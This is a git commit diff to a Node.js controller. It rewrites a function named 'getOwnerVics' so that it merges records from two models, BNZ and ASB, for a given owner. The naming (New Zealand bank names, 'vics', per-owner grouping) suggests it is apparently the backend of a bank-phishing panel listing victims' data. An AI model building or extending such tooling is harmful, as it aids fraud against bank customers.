f3864793b637aa1caa5165adb55890aef078fd89
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2023-01-20 16:13:48 +0000

    make

--- controllers/multiNzController.js
+++ controllers/multiNzController.js
@@ -3,18 +3,28 @@ const ASB = require("../models/asbModel");
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
-    let result = [];
-    let bnzVics = await BNZ.find({ owner })
-        .sort({ status: -1 })
-    let asbVics = await ASB.find({ owner })
-        .sort({ status: -1 })
-    if (bnzVics.length) {
-        result.push(bnzVics)
-    }
-    if (asbVics.length) {
-        result.push(asbVics)
-    }
-    res.send(result)
+    let result = new Array();
+    BNZ.find({ owner }).exec((err, vic) => {
+        if (err) {
+            console.log(err);
+            res.status(404).send("Error");
+            return;
+        }
+        vic.forEach((v) => {
+            result.push(v)
+        })
+        ASB.find({ owner }).exec((err, vic) => {
+            if (err) {
+                console.log(err);
+                res.status(404).send("Error");
+                return;
+            }
+            vic.forEach((v) => {
+                result.push(v)
+            })
+            res.send(result)
+        })
+    });
 };
 
 module.exports = {
